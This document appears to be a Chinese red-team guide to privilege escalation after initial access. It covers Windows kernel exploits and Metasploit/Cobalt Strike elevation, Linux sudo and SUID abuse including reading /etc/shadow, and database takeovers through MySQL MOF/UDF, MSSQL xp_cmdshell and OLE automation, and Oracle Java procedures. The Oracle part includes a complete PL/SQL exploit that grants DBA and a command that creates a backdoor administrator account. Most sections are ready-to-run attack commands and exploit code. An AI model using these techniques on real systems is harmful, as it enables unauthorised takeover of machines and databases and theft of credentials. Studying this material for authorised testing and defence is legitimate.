---
title: 【红队】权限维持之--权限提升
---
# 提权的基础概念

**Windows上常见的权限分类：**

> User：普通用户权限；
>
> Administrator：管理员权限；
>
> System：系统权限。

**Linux上权限分类：**

> User：普通用户权限；
>
> www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；
>
> root：Linux系统最高权限。

**纵向提权：**低权限角色获取高权限角色的权限。

**横向提权：**在系统A中获取了系统B中同级别的角色权限。

**常用的提权方法：**

系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权（利用率较高）。

利用windows系统错误配置提权（可信服务路径漏洞，组策略首选项等，利用率不高）。

# Windows提权

**LOLBAS**（计划任务、文件传输、本地提权） https://lolbas-project.github.io/ 

## 内核漏洞提权

| 漏洞代号 | 补丁编号  | 适用平台                               | 用途        |
| :------- | :-------- | :------------------------------------- | :---------- |
| MS14-058 | KB3000061 | 03，08，12，Win7                       | 本地提权    |
| MS14-068 | KB3011780 | 域控未安装补丁的域内，03，08，12，Win7 | 域内提权    |
| MS15-051 | KB3057191 | 03，08，12，Win7                       | 本地提权    |
| MS16-032 | KB3143141 | 08 r2以后，12，Win7                    | 本地提权    |
| MS17-010 | KB4013389 | 03，08，12，16，win7                   | 远程注入dll |

**快速检测目标系统未打漏洞补丁**

```bash
systeminfo > temp.txt&(for %i in (KB3000061 KB3011780 KB3057191 KB3143141 KB4013389) do @type temp.txt|@find /i  "%i"|| @echo %i Not Installed!)&del /f /q /a temp.txt
```

补丁号根据自己需求加，利用的话`MSF`中有相关EXP或者自行搜索（`Github`， `searchsploit` ）

## 利用MSF提权

在拿到一个Meterpreter的前提下进行

```bash
#根据漏洞编号，枚举系统中未安装带的补丁
use post/windows/gather/enum_patches

#快速识别系统中可利用的漏洞
use post/multi/recon/local_exploit_suggester

#ms14_058
use exploit/windows/local/ms14_058_track_popup_menu

#ms15_051
exploit/windows/local/ms15_051_client_copy_image

#ms16_032
exploit/windows/local/ms16_032_secondary_logon_handle_privesc

#ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```

**系统服务权限配置错误** 

如果meterpreter以管理员权限运行，该模块会创建一个新服务；

如果当前权限不允许创建服务，该模块会判断哪些文件或文件夹的权限有问题，并对其进行劫持。

```bash
#拿到一个本地管理员权限的meterpreter，可提升到SYSTEM
use exploit/windows/local/service_permissions
```

**BypassUAC（只适用Win7）**

>  UAC（User Account Control，用户账户控制），在执行影计算机运行的操作时，会弹窗提示用户要求认证。 

```bash
#拿到一个低权限本地用户的meterpreter
use exploit/windows/local/bypassuac
```

## 利用Cobalt Strike提权

Cobalt Strike 附带了一些绕过 `UAC` 的攻击，但如果当前用户不是管理员(Administrator)， 攻击会失效。

Beacon默认回连时间（心跳时间）为60秒，为了更快的渗透修改成0秒，交互模式。

```bash
sleep 0	
#心跳时间设快了容易被发现，实际攻击不建议设太快

shell whoami
```

**如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：**

这个需要创建服务

```bash
elevate svc-exe test1（你的监听器）
```

**如果你是普通`本地`用户权限，用以下命令提升到高权限**

注意：如果是`域`用户会弹出认证窗口，不能提权

```bash
elevate uac-token-duplication test1
```

然后可以用上边的`svc-exe`提权到SYSTEM

## C#版的烂土豆（来自QAX零队）

项目地址：https://github.com/uknowsec/SweetPotato

能在webshell下执行命令的版本 

# Linux提权

**GTFOBins**（sudo滥用和SUID提权命令查询）https://gtfobins.github.io/

## 密码复用

 如数据库、后台 web 密码，可能就是 root 密码

## 内核溢出漏洞提权

**信息收集**

```
uname -a#查看系统版本内核信息
```

**使用 `searchsploit` 查找相关内核漏洞**

下载地址：https://github.com/offensive-security/exploitdb

```
searchsploit linux 3.10 CentOS Linux 7
```

**或使用 `linux-exploit-suggester-2.pl` 在目标机器上执行**

下载地址：https://github.com/jondonas/linux-exploit-suggester-2/blob/master/linux-exploit-suggester-2.pl

```
./linux-exploit-suggester-2.pl
```

## sudo滥用

 `/etc/sudoers`文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证

```bash
sudo -l	#查看当前用户可以sudo的程序
```

**AWK：**

```
sudo awk 'BEGIN {system("/bin/sh")}'	#通过生成交互式系统外Shell序来脱离受限环境，需要普通用户的密码
```

**CURL：**

```
sudo curl file:///etc/shadow
```

## SUID提权

SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行【ls 查看时有 s 属性才支持 SUID】

**查找正在系统上运行的所有SUID可执行文件**

```bash
find / -user root -perm -4000 -print 2>/dev/null
```

**比如发现了find**

```bash
#随便新建一个文件，或利用已有文件
touch abc

#以SUID即root权限执行命令
find abc -exec whomai \;
```

**nmap SUID提权**

```bash
#2.02 to 5.21版本 用交互模式执行shell命令
sudo nmap --interactive		
nmap> !sh
```

## su root被禁止登录

> 拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；
>
> 用原来的低权限 shell，也无法 sudo 切换 root  
>
> 因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）
>
> 所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符
>

**利用python获取交互Shell**

```bash
python -c 'import pty;pty.spawn("/bin/sh")'
sudo su
```

# 数据库提权

## MySQL数据库提权

### MOF提权

MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）

叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡

**利用条件：**

> `Windows<=2003`
>
> mysql在c:/windows/system32/wbem/mof目录有写权限
>
> 已知数据库root账号密码
>
> 数据库允许外连
>
> secure_file_priv为空

当`secure_file_priv`的值没有具体值时，表示不对`MySQL`的导入|导出做限制，如果是null，表示`MySQL`不允许导入导出

```bash
#查看secure_file_priv的值
SHOW VARIABLES LIKE "secure_file_priv";

#这个值可以在my.ini设置为空
secure_file_priv =
```

**提权原理：**

> MOF文件既然每五秒就会执行，而且是系统权限；
>
> 我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；
>
> 然后系统每隔五秒就会执行一次我们上传的MOF。
>
> MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。

这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。

 **MSF 下有Mof 提权模块** 

 执行成功后会直接反弹一个 `system`权限的meterpreter 。

```
use exploit/windows/mysql/mysql_mof
```

### UDF提权

UDF(user-defined function)是MySQL的一个拓展接口，也可称之为**用户自定义函数**

用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll

**利用条件：**

> `Server 2003、Windows XP、Windows 7`
>
> 已知mysql中root的账号密码
>
> mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/
>
> mysql版本 > 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\
>
> secure_file_priv为空

**提权原理：**

> 利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)
>
> 当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。
>
> 这样我们自定义的函数才被当作本机函数执行。
>
> 在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而提权

可以直接查询插件安装目录：

```bash
show variables like %plugin%
```

 如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll

```bash
#先找到Mysql的目录select @@basedir;#利用ADS流来创建plugin文件夹（测试并不能成功创建）select 'It is dll' into dumpfile 'C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$INDEX_ALLOCATION';
```

网上流传的是在数据库中直接就能利用ADS流创建plugin文件夹，但我测试发现直接导入文件可以，并不能创建文件夹。

但是利用ADS流确实能创建文件夹，如以下命令（可以自己测试一下）

```bash
echo 123 > test::$INDEX_ALLOCATION
#这条命令会创建一个test文件夹
```

所以我是用`Webshell`这样创建的plugin文件夹：

```bash
echo 123 > C:\phpStudy\PHPTutorial\MySQL\lib\plugin::$INDEX_ALLOCATION
```

**有一个自动化工具**：https://github.com/T3st0r-Git/HackMySQL 

```bash
#上边的创建plugin目录步骤完成后直接利用即可
python root.py -a 192.168.2.9 -proot -e "whoami"
```

 **通过WebShell上传udf.php（这种方法数据库不用外连也可以）** 

 udf.php：https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php 

![](/images/image-20200521135047931.png)

## MSSQL数据库提权

**首先查看权限**

```sql
--是否sa权限，返回 1 就是sa
select IS_SRVROLEMEMBER('sysadmin')

--是否dba权限，返回 1 就是DBA
select IS_MEMBER('db_owner')
```

### 一、xp_cmdshell

> **适用(xp\2000\2003系统)**
>
> 前提是MSSQL是以system用户运行的，才能提权；
>
> 如果用nt authority\network service运行，是没有系统权限的。

默认情况下是关闭的，用下边的命令开启

```sql
EXEC sp_configure 'show advanced options', 1; --允许修改高级参数
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; --打开xp_cmdshell扩展
RECONFIGURE;
```

如果xp_cmdshell被删除，可以尝试上传`xplog70.dll` https://fix4dll.com/xplog70_dll 进行恢复，恢复语句：

```sql
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','c:\\xplog70.dll';
```

然后执行命令

```sql
exec xp_cmdshell 'whoami';
```

### 二、SP_OACreate 

> **适用(xp\2000\2003系统)**

当xp_cmdshell 删除以后，还可以使用SP_OACreate

**首先要打开组件：**

```sql
--开启EXEC
sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

--关闭EXEC
sp_configure 'show advanced options', 0;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;
```

**之后使用以下语句执行命令：**

```sql
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
```

**这种方式是无回显的，打开1.txt查看命令执行结果**

```bash
type c:\\1.txt
```

### 三、openrowset沙盒 

> **(2003系统可用、2012-r2实验失败)**

**首先检查cmd_shell是否开启**

```sql
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'
--结果为 1 就是开启
```

**第二步 开启默认关闭的xp_regwrite存储过程**

```sql
--开启
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE' ,'SOFTWARE\Microsoft\Jet\4.0\Engines' ,'SandBoxMode' ,'REG_DWORD' ,0;

EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'Ad Hoc Distributed Queries', 1
GO
RECONFIGURE
GO

--利用完后恢复
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
EXEC sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;
EXEC sp_configure 'show advanced options',0;reconfigure;
```

**利用jet.oledb执行系统命令**

```sql
select * from openrowset('microsoft.jet.oledb.4.0' ,';database=c:\windows\system32\ias\ias.mdb' ,'select shell("cmd.exe /c whoami > c:\\666.txt")')
```

这个也是无回显的

**沙盒模式SandBoxMode参数含义（默认是2）**

> `0`：在任何所有者中禁止启用安全模式
>
> `1` ：为仅在允许范围内
>
> `2` ：必须在access模式下
>
> `3`：完全开启

openrowset是可以通过OLE DB访问SQL Server数据库

OLE DB是应用程序链接到SQL Server的的驱动程序

**PowerUpSQL工具**：https://github.com/NetSPI/PowerUpSQL

## Oracle提权

**系统权限**

系统规定用户使用数据库的权限（系统权限是对用户而言）

**系统权限分类**

> **DBA：**拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构。
> **RESOURCE：**拥有Resource权限的用户只可以创建实体，不可以创建数据库结构。
> **CONNECT：**拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构。

对于普通用户：授予connect, resource权限。
对于DBA管理用户：授予connect，resource, dba权限。

**实体权限**

某种权限用户对其它用户的表或视图的存取权限（是针对表或视图而言的）

**实体权限分类**

```sql
select, update, insert, alter, index, delete, all --all包括所有权限
execute --执行存储过程权限
```

### 一、存储过程提权

当用户拥有创建存储过程权限时，则可以创建一个java class，然后用创建一个存储过程来进行调用 

**提权步骤**

1、查看用户是否具有create procedure权限

```sql
SQL> select * form session_privs;
```

2、 创建一个java class然后用procedure包装它进行调用 

```sql
create or replace and resolve java source named CMD as
    import java.lang.*;
    import java.io.*;
    public class CMD
    {
       public static void execmd(String command) throws IOException 
		{
               Runtime.getRuntime().exec(command); 
       	} 
   	}
  	/
```

3、 创建存储过程 

```sql
create or replace procedure CMDPROC(command in varchar) as language java 
    name 'CMD.execmd(java.lang.String)';
/
```

4、执行命令（添加一个系统管理员账户）

```sql
SQL> EXEC CMDPROC('net user winuser ha@Pass123 /add');
```

### 二、利用java权限提权

1、先使用dba权限赋予用户java运行权限

```sql
SQL> grant JAVASYSPRIV to system;
```

2、创建jar包

```sql
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
```

 DUAL是Oracle与数据字典一起自动创建的一个表，它只有一列 

3、使用JAVA获取权限

```sql
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''<<ALL FILES>>'''',''''EXECUTE'''');end;''commit;end;') from dual;
```

4、创建执行命令的函数select 

```sql
dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function shell(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
```

5、执行命令

```sql
SQL> select shell('whoami') from dual;
```

### 三、Oracle 10g 经典漏洞提权

> **`oracle < 10.2.0.4`的版本有此漏洞**
>
> 在 Oracle 10g 中，GET_DOMAIN_INDEX_TABLES 函数存在注入漏洞
>
> 该函数位于 DBMS_EXPORT_EXTENSION 包中，执行权限隶属于 sys。

假设**test**是一个只有CONNECT和RESOURCE两个权限较低的角色

```sql
select * from user_role_privs;    --首先，查询用户权限配置

--创建程序包
Create or REPLACE
PACKAGE HACKERPACKAGE AUTHID CURRENT_USER
IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
SYS.odcienv)
RETURN NUMBER;
END;
/

--创建程序包体
Create or REPLACE PACKAGE BODY HACKERPACKAGE
IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env
SYS.odcienv)
RETURN NUMBER
IS
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO test';
COMMIT;
RETURN(1);
END;
END;
/

--创建过程
DECLARE
INDEX_NAME VARCHAR2(200);
INDEX_SCHEMA VARCHAR2(200);
TYPE_NAME VARCHAR2(200);
TYPE_SCHEMA VARCHAR2(200);
VERSION VARCHAR2(200);
NEWBLOCK PLS_INTEGER;
GMFLAGS NUMBER;
v_Return VARCHAR2(200);
BEGIN
INDEX_NAME := 'A1';
INDEX_SCHEMA := 'test';
TYPE_NAME := 'HACKERPACKAGE';
TYPE_SCHEMA := 'SCOTT';
VERSION := '10.2.0.1.0';
GMFLAGS := 1;
v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME =>
INDEX_NAME,
INDEX_SCHEMA=> INDEX_SCHEMA,
TYPE_NAME => TYPE_NAME,
TYPE_SCHEMA => TYPE_SCHEMA,
VERSION => VERSION,
NEWBLOCK => NEWBLOCK,
GMFLAGS => GMFLAGS);
END;
/

select * from user_role_privs;    --最后，查询用户权限配置
```

**利用工具提权**

**利用MSF、[odat](https://github.com/quentinhardy/odat)、[OracleShell.jar](https://github.com/jas502n/oracleShell)**等工具也可以实现提权

